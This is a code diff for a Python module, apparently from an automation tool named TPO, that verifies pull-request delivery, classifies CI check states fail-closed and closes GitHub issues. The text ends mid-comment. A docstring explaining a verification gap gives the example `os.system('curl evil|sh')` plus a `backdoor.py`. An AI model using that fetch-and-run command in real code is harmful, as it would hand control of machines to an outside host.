@@ -1,4 +1,4 @@
-"""Verified PR handoff, human merge gate, and idempotent GitHub issue closeout."""
+"""Verified PR handoff and idempotent GitHub issue closeout."""
 from __future__ import annotations
 
 import datetime as dt
@@ -12,28 +12,29 @@ from typing import Literal
 from . import github_issues
 from .github_issues import IN_PROGRESS_LABEL, parse_github_remote
 from .kanban_tasks import (
-    _mark_gate_needs_input,
     _show_task_payload,
-    complete_todo_kanban_task,
     get_todo_kanban_tasks,
 )
 from .result_contract import (
     ResultContractError,
     load_validated_registration,
     parse_worker_result,
+    render_result_template,
     sanitize_result_text,
+    verify_optional_single_commit,
 )
 from .review_reconciliation import (
-    REVIEW_ACCEPTANCE_KEY,
     RetryableReviewRegistration,
     _create_task,
+    profile_phase,
+    render_profile_prompt,
 )
 from .state import _atomic_write_text
 
 log = logging.getLogger(__name__)
 
 FINISH_KEY = "finish"
-HUMAN_GATE_KEY = "human-gate"
+FINISH_PHASE_KEY = "phase_8_finish_branch"
 
 
 def _git(worktree: Path, *args: str) -> str:
@@ -48,11 +49,11 @@ def _git(worktree: Path, *args: str) -> str:
     return result.stdout.strip()
 
 
-def _pr_view(worktree: Path, pr_url: str) -> dict[str, str]:
+def _pr_view(worktree: Path, pr_url: str) -> dict[str, object]:
     try:
         result = subprocess.run(
             ["gh", "pr", "view", pr_url, "--json",
-             "state,url,headRefName,headRefOid,baseRefName,headRepository,baseRepository"],
+             "state,url,headRefName,headRefOid,baseRefName,headRepository,isCrossRepository"],
             cwd=worktree, capture_output=True, text=True, timeout=60,
         )
     except (OSError, subprocess.TimeoutExpired, UnicodeError) as exc:
@@ -81,7 +82,272 @@ def _remote_head(worktree: Path, branch: str) -> str:
     return result.stdout.split()[0]
 
 
-def _check_state(worktree: Path, pr_url: str) -> str:
+# Check-state vocabulary, transcribed from gh 2.89.0
+# `pkg/cmd/pr/checks/aggregate.go`, which buckets every state it knows:
+# SUCCESS -> pass; SKIPPED, NEUTRAL -> skipping; ERROR, FAILURE, TIMED_OUT,
+# ACTION_REQUIRED -> fail; CANCELLED -> cancel; everything else -> pending.
+#
+# We reuse gh's green and red buckets and diverge deliberately on three states,
+# because gh's buckets serve a watch loop a human is staring at while ours
+# decides, unattended and unbounded, whether to close a delivered issue:
+#
+#   CANCELLED       gh calls it non-blocking. We fail it. A cancelled required
+#                   check is not evidence that it passed, and this divergence
+#                   fails CLOSED (a human is asked), so it is the safe one.
+#   STALE           gh buckets both as pending only because its default arm
+#   STARTUP_FAILURE catches every unlisted state. Neither is transient: a stale
+#                   check will not re-run on its own and a startup failure has
+#                   already ended. `pending` here means "return True every tick,
+#                   forever, silently", so they fail closed too.
+#
+# States absent from all three sets (a state gh grows after this was written)
+# are unreadable evidence, not a silent pass and not a silent wait: see
+# `_classify_check_states`.
+_CHECKS_GREEN = frozenset({"SUCCESS", "SKIPPED", "NEUTRAL"})
+_CHECKS_RED = frozenset({
+    "ERROR", "FAILURE", "TIMED_OUT", "ACTION_REQUIRED", "CANCELLED",
+    "STALE", "STARTUP_FAILURE",
+})
+# `""` is in here, not an unknown: `aggregate.go` derives `state` from the
+# conclusion once `status == "COMPLETED"`, so a check run completed with a null
+# conclusion -- the brief window before the conclusion lands, and what a deleted
+# or expired run degrades to -- exports as the empty string. gh's own default arm
+# buckets it pending; raising instead would summon a human for something that
+# resolves itself on the next tick.
+_CHECKS_TRANSIENT = frozenset({
+    "EXPECTED", "REQUESTED", "WAITING", "QUEUED", "PENDING", "IN_PROGRESS", "",
+})
+
+# gh's message for an empty status-check rollup on the head commit
+# (`checks.go`: `no checks reported on the '%s' branch`). Matched as an anchored
+# prefix of the first stderr line, not as a substring: `gh pr checks <arg>` echoes
+# its argument back in `no pull requests found for branch "<arg>"`, so a bare
+# substring test lets a crafted `pr_url` mint this signal for itself. That is
+# unreachable today only because `result_contract` pins `pr_url` to a strict
+# GitHub URL two modules away, and an approval predicate should not lean on a
+# guarantee enforced somewhere else. The branch name is interpolated, so the
+# match stops at the opening quote.
+_NO_CHECKS_STDERR_PREFIX = "no checks reported on the '"
+
+
+def _classify_check_states(states: set[str]) -> str:
+    """Reduce one PR's check states to ``passed`` / ``failed`` / ``pending``.
+
+    Raises ``checks_unavailable`` for any state outside the vocabulary above: a
+    state gh grows after this was written is unreadable evidence, so it is neither
+    a silent pass nor an unbounded silent wait.
+
+    The empty-set arm is defence in depth, NOT the fix for the old
+    ``set() <= {"SUCCESS", "SKIPPED"}`` -> ``passed`` defect. What fixes that is
+    the strict per-item loop in ``_check_state``, which refuses an unreadable
+    entry outright instead of dropping it and shrinking the set. Given that loop,
+    ``states`` can only be empty when ``checks`` was empty, which returns earlier;
+    this arm exists so a future caller cannot reintroduce the defect by filtering.
+    """
+    if not states or not states <= (_CHECKS_GREEN | _CHECKS_RED | _CHECKS_TRANSIENT):
+        raise ResultContractError("checks_unavailable")
+    if states & _CHECKS_RED:
+        return "failed"
+    if states & _CHECKS_TRANSIENT:
+        return "pending"
+    return "passed"
+
+
+# The projection asked of `repos/{repo}/commits/{sha}/check-suites`. Bounded
+# output (the raw page is tens of kilobytes of commit and repository objects) and
+# an explicit `total` so a page that does not hold every suite is detectable.
+_CHECK_SUITES_JQ = (
+    "{total: .total_count, suites: [.check_suites[] | "
+    "{runs: .latest_check_runs_count, conclusion: .conclusion, "
+    "status: .status, app: .app.slug}]}"
+)
+
+# The App whose zero-run suite stays fail-closed; see `_rollup_is_honestly_empty`.
+_ACTIONS_APP_SLUG = "github-actions"
+
+
+def _corroborating_api(worktree: Path, endpoint: str, jq: str) -> str:
+    """One read-only `gh api` call made to prove a negative, failing closed.
+
+    Any failure to establish the fact -- a non-zero exit, a timeout, an OSError,
+    undecodable output -- raises ``checks_unavailable`` rather than returning
+    something a caller could read as absence: an error while proving a negative
+    is not proof of the negative.
+    """
+    try:
+        result = subprocess.run(
+            ["gh", "api", endpoint, "--jq", jq], cwd=worktree,
+            capture_output=True, text=True, timeout=60,
+        )
+    except (OSError, subprocess.TimeoutExpired, UnicodeError) as exc:
+        raise ResultContractError("checks_unavailable") from exc
+    if result.returncode != 0:
+        raise ResultContractError("checks_unavailable")
+    return result.stdout or ""
+
+
+def _rollup_is_honestly_empty(worktree: Path, *, repo: str, head_sha: str) -> bool:
+    """True only when *head_sha* really has no gate to pass.
+
+    gh raises `no checks reported on the '<branch>' branch` when the head commit's
+    ``statusCheckRollup`` is EMPTY (`checks.go`:
+    ``if len(statusCheckRollup.Nodes) == 0``). That is not the same claim as "this
+    repository has no CI", and at least six conditions produce it: no CI at all;
+    the rollup not yet populated after a push; Actions disabled on the repository;
+    a fork pull request whose workflows await maintainer approval; every workflow
+    path-filtered out of the diff; and a workflow *startup failure*, where a run
+    is created, concludes ``failure``, and produces zero jobs. Only the first
+    means "no gate to pass"; the rest mean "the gate did not report".
+
+    The startup failure is the one that must never be read as green here, because
+    TPO's own workers edit repository files including ``.github/workflows/*``: a
+    worker that breaks the workflow file deletes CI and produces exactly this
+    shape. (Note it never reaches the state vocabulary as ``STARTUP_FAILURE``; it
+    arrives as this error instead.) Nor is the post-merge framing a rescue --
+    ``pull_request`` workflows do not re-run after a merge, so a head commit that
+    never got a check run never will. The false green would be permanent.
+
+    Live repro: ``yehiashouman/WearExerciseManager#4``, MERGED at
+    ``4c14b532d7da2a99a9e3b337fece90a5336fdc43``, whose repository does have
+    ``.github/workflows/android.yml`` on ``pull_request``. gh reports no checks;
+    ``check-suites`` reports ``total_count: 1`` holding one ``github-actions``
+    suite ``{"latest_check_runs_count": 0, "status": "completed", "conclusion":
+    "failure"}``, and ``status`` reports ``total_count: 0``.
+
+    So the absence is corroborated against the commit itself, using the two REST
+    endpoints that expose the underlying objects rather than the rollup. What is
+    NOT usable is the check-suites ``total_count``: GitHub opens a check suite for
+    EVERY installed App subscribing to ``check_suite``, whether or not that App
+    ever produces a check run, so ``total_count >= 1`` is the normal state of any
+    repository with a common App installed and says nothing about whether a gate
+    exists. Verified read-only on 2026-09-05 -- every one of these head commits
+    carries zero-run suites, verbatim ``{"latest_check_runs_count": 0,
+    "conclusion": null, "status": "queued"}``:
+
+      dependabot/dependabot-core  github-service-catalog,
+                                  github-service-catalog-staging, sentry
+      sindresorhus/got            codecov, claude
+      prettier/prettier           codecov, netlify, circleci-checks, renovate,
+                                  vercel, autofix-ci, relativeci
+      astral-sh/uv                renovate
+      pallets/flask               read-the-docs-community
+
+    Requiring ``total_count == 0`` therefore failed CLOSED on all of them: every
+    tick raised ``checks_unavailable``, blocked the gate and demanded a human who
+    never arrives, for repositories that in fact had no gate to pass. The
+    discriminator that separates them from the startup failure is the suite
+    itself: a benign App suite is zero-run with a NULL conclusion; a startup
+    failure is zero-run with a NON-NULL conclusion. So the rollup is honestly
+    empty only when ALL of:
+
+    1. the ``status`` endpoint still reports ``total_count == 0``. Legacy commit
+       statuses are a real gate and this half is unchanged.
+    2. every check suite has ``latest_check_runs_count == 0``. A suite that
+       produced runs contradicts the empty rollup gh just reported -- those run
+       states were never classified, so they cannot be waved through.
+    3. every check suite has a NULL conclusion. Zero runs with a conclusion is
+       the startup-failure family: the App answered and produced nothing to read.
+    4. no suite's ``app.slug`` is ``github-actions``. LOAD-BEARING, and the one
+       condition that refuses a shape which is merely ambiguous: a zero-run
+       ``github-actions`` suite with a null conclusion is either workflows about
+       to start (a brief race right after a push) or workflows that will never
+       report, and the payload does not separate them. "No gate" is the risky
+       reading, and it is the same App the startup failure arrives under, so it
+       stays fail-closed. Third-party App suites are not ambiguous: they are Apps
+       that were notified and did nothing.
+
+    A suite whose ``app`` is null fails 4 for the same reason -- an unidentifiable
+    App cannot be ruled out. A page that does not hold every suite (``total``
+    exceeding the suites returned) is unread evidence, not absence.
+
+    Read-only throughout, and any failure to establish the negative -- a non-zero
+    exit, unparseable output, a timeout -- raises ``checks_unavailable`` rather
+    than falling through to an approval.
+    """
+    raw = _corroborating_api(
+        worktree,
+        f"repos/{repo}/commits/{head_sha}/check-suites?per_page=100",
+        _CHECK_SUITES_JQ,
+    )
+    try:
+        payload = json.loads(raw)
+    except json.JSONDecodeError as exc:
+        raise ResultContractError("checks_unavailable") from exc
+    if not isinstance(payload, dict):
+        raise ResultContractError("checks_unavailable")
+    suites = payload.get("suites")
+    total = payload.get("total")
+    # `bool` is an `int`; an unreadable envelope is unreadable evidence.
+    if not isinstance(suites, list) or not isinstance(total, int) or isinstance(total, bool):
+        raise ResultContractError("checks_unavailable")
+    if total != len(suites):
+        return False
+    for suite in suites:
+        if not isinstance(suite, dict):
+            raise ResultContractError("checks_unavailable")
+        runs = suite.get("runs")
+        conclusion = suite.get("conclusion")
+        app = suite.get("app")
+        if not isinstance(runs, int) or isinstance(runs, bool):
+            raise ResultContractError("checks_unavailable")
+        if conclusion is not None and not isinstance(conclusion, str):
+            raise ResultContractError("checks_unavailable")
+        if runs != 0 or conclusion is not None:
+            return False
+        if not isinstance(app, str) or app == _ACTIONS_APP_SLUG:
+            return False
+    statuses = _corroborating_api(
+        worktree, f"repos/{repo}/commits/{head_sha}/status", ".total_count",
+    )
+    try:
+        return int(statuses.strip()) == 0
+    except ValueError as exc:
+        raise ResultContractError("checks_unavailable") from exc
+
+
+def _check_state(worktree: Path, pr_url: str, *, repo: str, head_sha: str) -> str:
+    """Classify `gh pr checks --json state` for the post-merge delivery gate.
+
+    ``repo`` and ``head_sha`` identify the commit whose checks these are, and are
+    used only to corroborate an empty rollup. The caller has already verified both
+    against the live pull request (``_verify_pr_identity`` pins the PR to ``repo``;
+    ``view["headRefOid"] == delivery.head_sha`` is asserted, as ``pr_head_drift``,
+    on every path reaching here), so neither is re-derived loosely.
+
+    Three facts about gh 2.89.0 shape this, each confirmed against the live CLI:
+
+    * ``--json`` short-circuits the exit-code logic. ``checksRun`` returns
+      ``opts.Exporter.Write(...)`` *before* the tail that maps failures to
+      ``SilentError`` (exit 1) and pending runs to ``PendingError`` (exit 8), so
+      with ``--json`` gh exits 0 whatever the checks say. (A PR with FAILURE and
+      IN_PROGRESS runs exits 0 with ``--json`` and 1 without.) There is no exit-8
+      branch to write: the one removed from here could never fire.
+    * An EMPTY status-check rollup on the head commit fails earlier, inside
+      ``populateStatusChecks``: exit 1, EMPTY stdout, and
+      ``no checks reported on the '<branch>' branch`` on stderr. It never emits
+      ``[]`` with exit 0, so the old code's ``json.loads("")`` raised
+      ``checks_unavailable`` and wedged the gate permanently -- the issue never
+      closed, ``registration_state`` stayed ``active``, and the TODO stayed
+      ineligible forever. That signal is necessary but NOT sufficient for green;
+      see ``_rollup_is_honestly_empty``.
+    * Every other nonzero exit (auth, network, deleted PR, unknown JSON field)
+      also leaves stdout empty. A nonzero exit therefore never carries a payload
+      worth classifying, and one that somehow did could otherwise let a stray
+      ``[{"state": "SUCCESS"}]`` approve a delivery gh had just errored on.
+
+    This once diverged from ``ship.ci_is_green``, which answered green for an
+    empty rollup with no corroboration at all. Ship has since moved, and the two
+    sides now agree: ``ci_is_green`` is handed a bare list, so it raises
+    ``ChecksInconclusive`` rather than guessing, and ``ship._bump_and_merge`` --
+    which does know the repository and the head sha -- corroborates by calling
+    ``_rollup_is_honestly_empty`` below and merges only on a proven absence.
+
+    So there is ONE rule for "when is an empty rollup honest", and it lives here.
+    Ship imports it; ship does not restate it. Changing it below changes the ship
+    gate too, which is the point: a second copy is exactly what let the post-merge
+    delivery gate and the merge gate drift apart until ship was merging on a shape
+    this module already refused.
+    """
     try:
         result = subprocess.run(
             ["gh", "pr", "checks", pr_url, "--json", "state"], cwd=worktree,
@@ -89,24 +355,45 @@ def _check_state(worktree: Path, pr_url: str) -> str:
         )
     except (OSError, subprocess.TimeoutExpired, UnicodeError) as exc:
         raise ResultContractError("checks_unavailable") from exc
-    if result.returncode == 8:
-        return "pending"
+    if result.returncode != 0:
+        if (result.stdout or "").strip() or not (
+            (result.stderr or "").lstrip().startswith(_NO_CHECKS_STDERR_PREFIX)
+        ):
+            raise ResultContractError("checks_unavailable")
+        if _rollup_is_honestly_empty(worktree, repo=repo, head_sha=head_sha):
+            return "passed"
+        raise ResultContractError("checks_unavailable")
     try:
         checks = json.loads(result.stdout)
     except json.JSONDecodeError as exc:
         raise ResultContractError("checks_unavailable") from exc
+    # The list check guards the emptiness shortcut below, so the two are written
+    # as one decision: without it `json.loads` returning `0`, `null` or `{}` is
+    # falsy and would be approved as "no checks at all", and `5` or `true` would
+    # reach the iteration and escape as a bare `TypeError` rather than a block.
     if not isinstance(checks, list):
         raise ResultContractError("checks_unavailable")
     if not checks:
-        if result.returncode == 0:
+        # "No checks at all" makes the same claim as an empty rollup, so it earns
+        # the same corroboration. gh 2.89.0 cannot reach here -- `populateStatusChecks`
+        # errors on an empty rollup before the exporter runs -- but erroring on
+        # empty output is a known `--json` wart and normalising it to `[]` with
+        # exit 0 is the natural upstream fix. Approving uncorroborated here would
+        # lean on a guarantee enforced in a Go binary this repository does not
+        # control, which is exactly what the anchored sentinel above refuses to do.
+        if _rollup_is_honestly_empty(worktree, repo=repo, head_sha=head_sha):
             return "passed"
         raise ResultContractError("checks_unavailable")
-    states = {item.get("state") for item in checks if isinstance(item, dict)}
-    if states <= {"SUCCESS", "SKIPPED"}:
-        return "passed"
-    if states & {"FAILURE", "ERROR", "CANCELLED", "TIMED_OUT", "ACTION_REQUIRED"}:
-        return "failed"
-    return "pending"
+    # Strict, per item: one entry we cannot read makes the whole answer
+    # unreadable. Filtering such entries out instead is how the old code turned
+    # a payload of non-dicts into an empty -- and therefore "green" -- state set.
+    states: set[str] = set()
+    for item in checks:
+        state = item.get("state") if isinstance(item, dict) else None
+        if not isinstance(state, str):
+            raise ResultContractError("checks_unavailable")
+        states.add(state)
+    return _classify_check_states(states)
 
 
 def _github_identity(worktree: Path) -> tuple[str, str]:
@@ -128,14 +415,30 @@ def _name_with_owner(value: object) -> str | None:
 
 
 def _verify_pr_identity(worktree: Path, view: dict, *, branch: str, repo: str) -> None:
+    """Pin the PR to our branch, origin's base branch, and the project repository.
+
+    ``gh pr view`` exposes no ``baseRepository`` field, so the base repository is
+    established transitively: ``isCrossRepository`` is false exactly when head and
+    base repositories are the same, so head == origin plus not-cross-repository
+    means base == origin, and origin is then matched against ``repo``. A missing
+    or non-boolean ``isCrossRepository`` fails closed.
+
+    Repository names compare case-insensitively throughout: ``repository`` carries
+    whatever case the operator typed into the origin remote URL, while
+    ``headRepository.nameWithOwner`` carries GitHub's canonical case.
+    """
     repository, base_branch = _github_identity(worktree)
-    base_repository = _name_with_owner(view.get("baseRepository"))
+    head_repository = _name_with_owner(view.get("headRepository"))
     if (
         view.get("headRefName") != branch
         or view.get("baseRefName") != base_branch
-        or _name_with_owner(view.get("headRepository")) != repository
-        or base_repository is None
-        or base_repository.lower() != repo.lower()
+        or head_repository is None
+        or head_repository.lower() != repository.lower()
+        or view.get("isCrossRepository") is not False
+        # Defence in depth: unreachable in production, since _delivery_authority
+        # pins origin == repo and reconcile_todo_completion re-checks the pin
+        # before calling here. Kept as a fail-closed backstop.
+        or repository.lower() != repo.lower()
     ):
         raise ResultContractError("pr_identity_mismatch")
 
@@ -176,93 +479,91 @@ def _delivery_authority(state_dir: Path, tick_id: str, worktree: Path,
 
 def _verify_finish(worktree: Path, result, accepted_head: str,
                    *, require_current: bool) -> None:
-    git = result.git
-    if (
-        git.expected_parent_sha != accepted_head
-        or git.resulting_head_sha != accepted_head
-        or git.task_commit_sha != accepted_head
-        or git.changed_files
-    ):
-        raise ResultContractError("finish_review_head_mismatch")
-    if require_current and (
-        _git(worktree, "rev-parse", "HEAD") != accepted_head
-        or _git(worktree, "status", "--porcelain=v1", "--untracked-files=all")
-    ):
-        raise ResultContractError("finish_review_head_mismatch")
+    """Anchor the delivered head to the accepted review head.
+
+    The phase profile lets ``phase_8_finish_branch`` commit required release,
+    documentation or pull-request metadata as one separate atomic commit, so
+    demanding ``HEAD == accepted_head`` would reject a worker that did exactly
+    what the profile mandates. What may still not happen is delivery of a
+    history that does not descend from the one the review blessed:
+    ``accepted_head`` must remain on HEAD's first-parent mainline, and at most
+    one commit may sit between them, so a forged, rebased or side-merged
+    history is refused.
+
+    State the bound honestly, because it is weaker than a path check and this
+    docstring previously overstated it. What the relaxation admits is **one
+    commit of arbitrary content**, made in a session no reviewer sees: the
+    checks here constrain the commit's *topology* -- how many, whose child, and
+    that its reported paths match its real diff -- and nothing at all about
+    what it does. A single commit that rewrites a source file into
+    ``os.system('curl evil|sh')`` and adds a ``backdoor.py``, honestly
+    reported, satisfies every check on this path and is delivered. Before the
+    profile became authoritative ``changed_files == ()`` was required, so the
+    count of unreviewed commits that could reach delivery was zero; it is now
+    one. The human merge gate on the pull request is the only remaining control
+    over that commit's content. Constraining which paths a finish commit may
+    touch would change which runs are accepted -- and could reject legitimate
+    release metadata layouts in other repositories -- so it is deliberately not
+    decided here.
+    """
+    try:
+        verify_optional_single_commit(
+            worktree, result.git, expected_parent_sha=accepted_head,
+            require_current=require_current,
+        )
+    except ResultContractError as exc:
+        # A git exit code >= 2 means git could not answer, which is not the
+        # same claim as "the worker's report is wrong": let it through with its
+        # own code so the operator reads a broken worktree as broken. Every
+        # git-failure helper in ``result_contract`` raises this one code, so
+        # the set is a single member rather than a list that drifts.
+        if exc.code == "git_verification_failed":
+            raise
+        raise ResultContractError("finish_review_head_mismatch", exc.code) from exc
+    # No live-branch re-measurement follows. Under ``require_current`` the
+    # verifier above already proved ``HEAD == result.git.resulting_head_sha``
+    # and bounded ``accepted_head..resulting_head_sha`` to 0 or 1 commits on
+    # the first-parent mainline, so an ancestry test and a commit count against
+    # HEAD restate those two facts about the same commit and can never
+    # disagree with them.
 
 
-def _block(gate_id: str, code: str) -> bool:
-    _mark_gate_needs_input(
-        gate_id, sanitize_result_text(f"TPO delivery blocked: {code}", maximum=1000)
+def _blocked(tick_id: str, code: str) -> bool:
+    """Report a delivery stall. Returning False is the whole signal.
+
+    The tick turns a False reconciliation into a circuit-breaker no-progress
+    observation and an operator alert; there is no card to mark, because TPO
+    manufactures none.
+    """
+    log.error(
+        "tick %s: delivery blocked: %s", tick_id,
+        sanitize_result_text(code, maximum=1000),
     )
     return False
-
-
-def _needs_input(*, tasks: dict, registration, tenant: str, tick_id: str,
-                 parent: str, code: str) -> bool:
-    gate = tasks.get(HUMAN_GATE_KEY)
-    gate_id = gate.task_id if gate is not None else _create_task(
-        tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
-        key=HUMAN_GATE_KEY, title="Human delivery intervention",
-        prompt="TPO detected immutable delivery drift; a human must inspect it.",
-        worktree=registration.worktree, assignee=None, parent=parent,
-        prompt_client=registration.prompt_client, gate=True,
-    )
-    _mark_gate_needs_input(
-        gate_id, sanitize_result_text(f"TPO delivery blocked: {code}", maximum=1000)
-    )
-    return False
-
-
-def _human_merge_gate(*, tasks: dict, registration, tenant: str,
-                      tick_id: str, parent: str) -> str:
-    gate = tasks.get(HUMAN_GATE_KEY)
-    if gate is not None:
-        return gate.task_id
-    return _create_task(
-        tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
-        key=HUMAN_GATE_KEY, title="Human merge gate",
-        prompt="Waiting for a human to merge the exact verified pull request.",
-        worktree=registration.worktree, assignee=None, parent=parent,
-        prompt_client=registration.prompt_client, gate=True,
-    )
 
 
 def flag_issue_drift(
     *, project_dir: Path, state_dir: Path, tenant: str, tick_id: str, code: str,
     repo: str | None = None,
 ) -> bool:
-    """Block delivery on pinned-issue drift by marking the human gate ``needs_input``.
+    """Stop delivery on pinned-issue drift.
 
-    Creates the gate (parented to an existing card of the tick) when absent.
-    Without any card there is nothing to gate; the drift is logged and persisted
-    as a ``tracker_error`` decision so ``tpo status`` surfaces it. Always returns
-    False.
+    The drift is logged and persisted as a ``tracker_error`` decision so
+    ``tpo status`` surfaces it. Always returns False.
     """
-    registration = load_validated_registration(project_dir, state_dir, tick_id, repo=repo)
-    tasks = get_todo_kanban_tasks(tenant, tick_id)
-    if not tasks:
-        from .decision import record_tracker_error
+    load_validated_registration(project_dir, state_dir, tick_id, repo=repo)
+    from .decision import record_tracker_error
 
-        log.warning(
-            "tick %s: pinned issue drift (%s) but no kanban card exists to gate",
-            tick_id, code,
+    try:
+        # The tick's own decision file is write-once and already exists, so
+        # the drift record lives under its own key.
+        record_tracker_error(
+            state_dir=state_dir, tick_id=f"{tick_id}-issue-drift", project_slug=tenant,
+            code=f"issue_drift:{code}", counts_as_no_progress=True,
         )
-        try:
-            # The tick's own decision file is write-once and already exists, so
-            # the drift record lives under its own key.
-            record_tracker_error(
-                state_dir=state_dir, tick_id=f"{tick_id}-issue-drift", project_slug=tenant,
-                code=f"issue_drift:{code}", counts_as_no_progress=True,
-            )
-        except FileExistsError:
-            log.debug("tick %s: issue drift decision already recorded", tick_id)
-        return False
-    parent = next(iter(tasks.values())).task_id
-    return _needs_input(
-        tasks=tasks, registration=registration, tenant=tenant, tick_id=tick_id,
-        parent=parent, code=code,
-    )
+    except FileExistsError:
+        log.debug("tick %s: issue drift decision already recorded", tick_id)
+    return _blocked(tick_id, f"issue_drift:{code}")
 
 
 def _run_marker(state_dir: Path, tick_id: str, name: str) -> Path:
@@ -284,27 +585,49 @@ def reconcile_todo_completion(
     if getattr(registration, "manifest", object()) is None:
         return True
     tasks = get_todo_kanban_tasks(tenant, tick_id)
-    acceptance = tasks.get(REVIEW_ACCEPTANCE_KEY)
-    if acceptance is None or acceptance.status != "done":
-        return True
 
     finish = tasks.get(FINISH_KEY)
     if finish is None:
-        head = _accepted_head(state_dir, tick_id)
+        try:
+            # The accepted review head is written by the review reconciler when
+            # a review card reports a clean verdict. Its absence is the only
+            # "review not accepted yet" signal there is.
+            head = _accepted_head(state_dir, tick_id)
+        except ResultContractError:
+            return True
         _delivery_authority(state_dir, tick_id, registration.worktree, repo=repo, create=True)
-        _create_task(
-            tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
-            key=FINISH_KEY, title="Verify, push, and open pull request",
-            prompt=(
-                "Run every required repository gate on the clean reviewed head, then "
-                "push the registered branch and create or update its pull request. "
-                "Do not merge. Close with metadata.tpo_result.delivery containing the "
-                f"PR URL, branch {registration.branch}, exact head SHA, and checks. "
-                f"The expected parent is {head}."
-            ),
-            worktree=registration.worktree, assignee=registration.assignee,
-            parent=acceptance.task_id, prompt_client=registration.prompt_client,
-        )
+        phases_path, phase = profile_phase(registration, FINISH_PHASE_KEY)
+        try:
+            _create_task(
+                project_dir=project_dir,
+                tenant=tenant, tick_id=tick_id, todo_id=registration.todo_id,
+                key=FINISH_KEY, title=phase.name,
+                prompt=render_profile_prompt(
+                    registration, phase, phases_path, tick_id=tick_id, tenant=tenant,
+                    facts={
+                        "accepted_review_head_sha": head,
+                        "branch": registration.branch,
+                    },
+                ),
+                result_template=render_result_template(
+                    tick_id=tick_id,
+                    todo_id=registration.todo_id,
+                    step_key=FINISH_KEY,
+                    section="delivery",
+                    branch=registration.branch,
+                    allow_no_changes=True,
+                ),
+                worktree=registration.worktree, assignee=registration.assignee,
+                prompt_client=registration.prompt_client,
+                tools=phase.tools, turns=phase.turns, timeout=phase.timeout,
+            )
+        except RetryableReviewRegistration:
+            # Same handling ``reconcile_reviews`` gives the review card's own
+            # ambiguous create: the card may or may not have landed, so the
+            # next tick re-derives the truth from the snapshot. Letting it
+            # propagate raises the whole tick, and a tick that raises now fails
+            # the harness run as ``tick_crashed`` instead of costing one tick.
+            log.info("tick %s: finish card create is pending; retrying next tick", tick_id)
         return True
     if finish.status != "done":
         return True
@@ -323,8 +646,6 @@ def reconcile_todo_completion(
             registration.worktree, payload, accepted_head,
             require_current=not finish_verified.exists(),
         )
-        if not finish_verified.exists():
-            _atomic_write_text(finish_verified, accepted_head + "\n")
         delivery = payload.delivery
         if delivery.head_sha != payload.git.resulting_head_sha:
             raise ResultContractError("delivery_head_mismatch")
@@ -335,85 +656,74 @@ def reconcile_todo_completion(
         if pr_match is None or pr_match.group(1).lower() != repo.lower():
             raise ResultContractError("pr_identity_mismatch")
         pr_number = int(pr_match.group(2))
+        # Written last, only once every check above has passed. This marker is
+        # what relaxes ``require_current`` on the next tick, so writing it
+        # before ``delivery_head_mismatch``, ``delivery_authority_drift`` and
+        # ``pr_identity_mismatch`` were checked handed the weaker verification
+        # to the next tick on the strength of a tick that had FAILED delivery.
+        if not finish_verified.exists():
+            _atomic_write_text(finish_verified, accepted_head + "\n")
     except ResultContractError as exc:
-        return _needs_input(
-            tasks=tasks, registration=registration, tenant=tenant, tick_id=tick_id,
-            parent=finish.task_id, code=exc.code,
-        )
+        return _blocked(tick_id, exc.code)
 
-    gate = tasks.get(HUMAN_GATE_KEY)
-    if gate is None:
-        try:
-            view = _pr_view(registration.worktree, delivery.pr_url)
-            if view.get("url") != delivery.pr_url:
-                raise ResultContractError("pr_identity_mismatch")
-            _verify_pr_identity(
-                registration.worktree, view, branch=registration.branch, repo=repo,
-            )
-            if (
-                view.get("state") not in ("OPEN", "MERGED")
-                or view.get("headRefOid") != delivery.head_sha
-            ):
-                raise ResultContractError("pr_head_drift")
-            if view.get("state") == "OPEN" and (
-                _remote_head(registration.worktree, registration.branch) != delivery.head_sha
-            ):
-                raise ResultContractError("remote_head_drift")
-        except ResultContractError as exc:
-            return _needs_input(
-                tasks=tasks, registration=registration, tenant=tenant, tick_id=tick_id,
-                parent=finish.task_id, code=exc.code,
-            )
-        try:
-            gate_id = _human_merge_gate(
-                tasks=tasks, registration=registration, tenant=tenant,
-                tick_id=tick_id, parent=finish.task_id,
-            )
-        except RetryableReviewRegistration:
-            log.warning("tick %s: human-gate registration remains pending; retrying", tick_id)
-            return False
-        if view.get("state") != "MERGED":
-            _mark_gate_needs_input(
-                gate_id,
-                sanitize_result_text(f"Human merge required: {delivery.pr_url}", maximum=1000),
-            )
-            return True
-    else:
-        gate_id = gate.task_id
-        try:
-            view = _pr_view(registration.worktree, delivery.pr_url)
-            _verify_pr_identity(
-                registration.worktree, view, branch=registration.branch, repo=repo,
-            )
-        except ResultContractError as exc:
-            return _block(gate_id, exc.code)
+    try:
+        view = _pr_view(registration.worktree, delivery.pr_url)
+        # Every judgement below -- merge state, head, `_check_state`, the issue
+        # close -- is measured on the PR `gh` actually answered with, so the
+        # echoed `url` must be the PR the delivery named. `_verify_pr_identity`
+        # does not cover it: it pins the branch, base and repository, all of
+        # which another pull request of the same repository shares.
+        if view.get("url") != delivery.pr_url:
+            raise ResultContractError("pr_identity_mismatch")
+        _verify_pr_identity(
+            registration.worktree, view, branch=registration.branch, repo=repo,
+        )
         if view.get("state") != "MERGED" and (
             view.get("state") != "OPEN" or view.get("headRefName") != registration.branch
         ):
-            return _block(gate_id, "pull_request_closed_or_drifted")
+            raise ResultContractError("pull_request_closed_or_drifted")
         if view.get("headRefOid") != delivery.head_sha:
-            return _block(gate_id, "pr_head_drift")
+            raise ResultContractError("pr_head_drift")
+        if view.get("state") == "OPEN" and (
+            _remote_head(registration.worktree, registration.branch) != delivery.head_sha
+        ):
+            raise ResultContractError("remote_head_drift")
+    except ResultContractError as exc:
+        return _blocked(tick_id, exc.code)
 
     try:
-        checks = _check_state(registration.worktree, delivery.pr_url)
+        checks = _check_state(
+            registration.worktree, delivery.pr_url,
+            repo=repo, head_sha=delivery.head_sha,
+        )
     except ResultContractError as exc:
-        return _block(gate_id, exc.code)
+        return _blocked(tick_id, exc.code)
     if checks == "failed":
-        return _block(gate_id, "required_checks_failed")
+        # Not "required_checks_failed": `gh pr checks` runs without `--required`,
+        # so this counts advisory checks too. Passing `--required` instead would
+        # be worse. gh 2.89.0 carries a SECOND format string for that mode,
+        # `no required checks reported on the '%s' branch`, so a repository with
+        # CI but no branch protection -- no check is marked required -- would get
+        # that message for every PR. It does not match the anchored
